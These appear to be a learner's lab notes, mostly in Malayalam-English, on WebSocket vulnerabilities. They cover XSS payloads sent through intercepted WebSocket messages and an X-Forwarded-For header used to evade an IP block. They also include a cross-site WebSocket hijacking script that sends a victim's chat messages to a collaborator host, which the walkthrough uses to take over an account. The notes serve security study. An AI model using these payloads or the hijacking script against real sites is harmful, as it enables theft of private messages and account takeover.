## WebSockets :
-->oru http request enganeyan work chyunath enn aadyam nokam.web server umayi connect chyan nammal http/https enna protocols use chyunu.ee protocols use chyth url il namuk venda request ayakunu
-->reqeust ayach response kitunath vere oru TCP connection undakunu.enit response kitikazhinjal aa TCP connection close aakum(Note: port connection undakum).eg: oru site 5 different request ayakunundengil 5 different tcp connections seperate aayi undakkunu.response kitunathinanusarich oro connection um close aakunu
-->Websockets involve aakuna samayath ws:// oru wss:// enna protocol aan use chyuka ie,wss://google.com.ws http pole encruption ila.so wss aan nallath(TLS connection undakum)
-->WebSocket connections are initiated over HTTP.To establish the connection, the browser and server perform a WebSocket handshake over HTTP
-->http/https use unidirectional communication.athayath sender oru request trigger chythale response kitu
-->Websockets are bidirectional.athayath sender can send the data and the receiver can also send the data(sender enthengilum request ayachale server enthengilum ayaku enna paripadi ivide illa) eg: chat application.so browser il namal chat window open chythu enit namude friend in oru hai ayakunu.apol ee mesg server ilek pokunu enit server aan friend in ee hait enna msg ayakunath.so sender um data send chyunu server um data send chyunu
-->Websockets dont close the connection which they open.so oru client server umayi connection establish chythal onnengil client allengil server connection close chyanam alland connection close aakila
-->browser il oke game kalikumbol namuk manual aayi page refresh chyuo onum venda automatic aayi refresh aayikolum karanam namuk connection open aayi thane kidkualle.
-->chat applications heavily use Websockets
-->real time updates kitanengil websockets thane use chyanam.old datas oke kitan aangengil nammal http thane use chyunathan nallath ath ini api aanaengilum
-->presesntly nadakuna datas kitan matharamam wesockets use chyendath
-->websockets il origin vulnerability undakum.so correct aayi origin validate chyanam ilengil cors polula exploit undakam


             Lab-1(Manipulating WebSocket messages to exploit vulnerabilities)
-->burp il prxy tab il http history yude apartheyit websockets history enna tab und athilan websockets inte traffic kanan patuka
-->so ivide lab il oru live chat enna button und so athil click chythal avarumayi namuk chat chyam.burp il nokiyal manasilakum websocket use chythan live chat chyunathenn
-->so message il `<hello > xss` ennoke adikuka enit nokiyal manasilakum `<>` polulla symbols server ilek send chyunathin mumb client side il ninum html-encode chyununden
-->ith manasilkana websockets history alla athinekal nallath intercept on aakuka enit `< hello >` enn adich send adikumbol ath intercept chyum apol thane namuk kanam ee symbols oke html-encode chyununden
-->so nammal enth chyanam ennal client side il ee encoding nadathan anuvadhichooda.so onukoodu intercept on aakuka
-->enit message il enthengilum adikuka.enit intercept chythit avide nammal xss payload kodukuka apol client in encode chyanum patila ath nere server ilek pokukayum chyum xss trigger aakukayum chyum
-->so aadyam enthengilum msg il kodukuka enit ath intercept chyth athile ulla message remove chythit ee paylaod kodukuka ->`<img src=1 onerror='alert(1)'>` enit intercept on aayal ee xss popup trigger aakum

==============================================================

           Lab-2(Manipulating the WebSocket handshake to exploit vulnerabilities)
-->ividem nerthepole live chat il aan test chyunath.so live chat button click chyth message ayakuka
-->enit aa ayacha message repeater ilek viduka.enit oru xss payload kodukuka- `<img src=1 onerror='alert(1)'>` enit repeater il send chyuka
-->apol kanam namude connection terminate aayi athupole thane namale block um aaki
-->so repreater il thane reconnect enna option und athil click chyth reconnect chyan nokumbol connect aakunila
-->so chelapo namude ip adress vech namale block chyunathakum.ath check chyan `X-Forwarded-For: 1.1.1.1` enna header use chyuka enit connect adikumbol namuk pinem reconnect chyan kazhiyunund
-->ini adutha payload check chyanam ->``<img src=1 oNeRrOr=alert`1`>`` ee payload itt test chyumbol error onum kanikunila.illengil attack enno mato kanikum repeateri ile history optionil 
-->repeater il history enna oru box und athil nammal chyunathellam kanikum
-->so ini browser il nammal aa live chat page reload chythal aakila.so burp il intercept on aakuka enit live chat page reload chyuka enit burp il oro request ilum `X-Forwarded-For: 1.1.1.1` ee header kodukanam enit avasanam aa page load aakum apol xss trigger aakum

==============================================================

### cross-site WebSocket hijacking :
-->Cross-site WebSocket hijacking (also known as cross-origin WebSocket hijacking) involves a cross-site request forgery (CSRF) vulnerability on a WebSocket handshake
-->It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values.
-->An attacker can create a malicious web page on their own domain which establishes a cross-site WebSocket connection to the vulnerable application. The application will handle the connection in the context of the victim user's session with the application.
-->The attacker's page can then send arbitrary messages to the server via the connection and read the contents of messages that are received back from the server. This means that, unlike regular CSRF, the attacker gains two-way interaction with the compromised application.
-->oru eg nokam :
             
			  GET /chat HTTP/1.1 
              Host: normal-website.com 
              Sec-WebSocket-Version: 13 
              Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w== 
              Connection: keep-alive, Upgrade 
              Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2 
              Upgrade: websocket
              
-->the above WebSocket handshake request is probably vulnerable to CSRF, because the only session token is transmitted in a cookie
-->==The Sec-WebSocket-Key header contains a random value to prevent errors from caching proxies, and is not used for authentication or session handling purposes==
-->If the WebSocket handshake request is vulnerable to CSRF, then an attacker's web page can perform a cross-site request to open a WebSocket on the vulnerable site. What happens next in the attack depends entirely on the application's logic and how it is using Websockets

==============================================================


           Lab-3(Cross-site WebSocket hijacking)
-->ivide namal lab il keruka enit athil live chat option undakum athil keri enthengilum msg type chyuka enit chat il ninum leave chyuka
-->enit thirich live chat ilek veendum kerumbol kanam nammal nerethe type chytha mesages oke namuk browser il kitunund. ie, that the "READY" command retrieves past chat messages from the server
-->In Burp Proxy, in the HTTP history tab, find the WebSocket handshake request. Observe that the request has no CSRF token
-->ee attack ozhivakan server oru origin: header use chyanam enn thonunu karnam csrf attack nadakumbol vere origin il ninanallo request varuka . ith ilengil victim already logged in aan athupole session cookie und so server in oru samshayavum varila.athukond thane attack nadakum
-->ini aa /chat request il poi right click chyth copy url adikuka.ee request il aan websocket umayi handshake nadakunath so ithinte url aan vendath
-->in csrf script undakam :
 
 <script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
          ws.send("READY");
    };
    ws.onmessage = function(event) {
          fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>

-->namal burp collaborator client use chyunun. ini deliver to exploit adikuka
-->enit collaborator il poi poll click chyuka apol namuk kanan kazhiyum http requests
-->so athil oronum click chyth request oke study chyuka.apol namuk carlos inte past messages oke kanan patum.so athil avan password forgot aayi enn parayunu.
-->so avan password live chat il ayackkodukunu server so aa password eduth carlos aayi log in chyuka apol lab solve aayi ok.